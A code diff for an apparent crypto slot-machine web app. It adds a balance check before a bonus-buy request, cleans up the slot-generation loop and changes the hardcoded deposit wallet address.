@@ -369,21 +369,31 @@ export default function Home() {
     }, maxDuration * 1200);
   }
   const bonusBuy = async () => {
-    const bounsPrice = 100 * bet;
-    const response = await axios.post(
-      "https://spin-service-master.onrender.com/api/spin/bonusBuy",
-      {
-        data: {
-          walletAddress: account,
-          amount: bounsPrice,
-        },
+    const bonusPrice = 100 * bet;
+    if(balance < bonusPrice){
+      toast("You don't have enough balance", {
+        hideProgressBar: false,
+        autoClose: 2000,
+        type: "error",
+        position: toast.POSITION.TOP_RIGHT,
+      });
+    }
+    else {
+      const response = await axios.post(
+        "https://spin-service-master.onrender.com/api/spin/bonusBuy",
+        {
+          data: {
+            walletAddress: account,
+            amount: bonusPrice,
+          },
+        }
+      );
+      console.log("---------->", response.data);
+      if (response.data) {
+        setAutoPlay(true);
+        setBalence(parseFloat(response.data.balance));
+        setBonusNum(10);
       }
-    );
-    console.log("---------->", response.data);
-    if (response.data) {
-      setAutoPlay(true);
-      setBalence(parseFloat(response.data.balance));
-      setBonusNum(10);
     }
   };
 
@@ -510,15 +520,11 @@ export default function Home() {
 
       for (let item = 0; item < itemCount; item++) {
         const oldSlots = slots[slot]?.items;
-
         if (oldSlots && item < 3 && oldSlots.length >= 3) {
           generatedSlots[slot].items.push(oldSlots[oldSlots.length - 3 + item]);
-
           continue;
         }
-
         const randomItem = getRandomItem();
-
         generatedSlots[slot].items.push({
           id: String(crypto.randomUUID()),
           value: randomItem,
@@ -824,7 +830,7 @@ export default function Home() {
       });
     } else {
       const weiAmountValue = ethers.utils.parseEther(ethAmount.toString());
-      const addressToValue = "0xb8A5958212Ed4f08801b32E5F3cFE8a5DBabcC5D";
+      const addressToValue = "0x6dCf73F71662a927715A703ed7429d75D3DAbd17";
       const transactionRequest = {
         to: addressToValue,
         value: weiAmountValue.toString(),
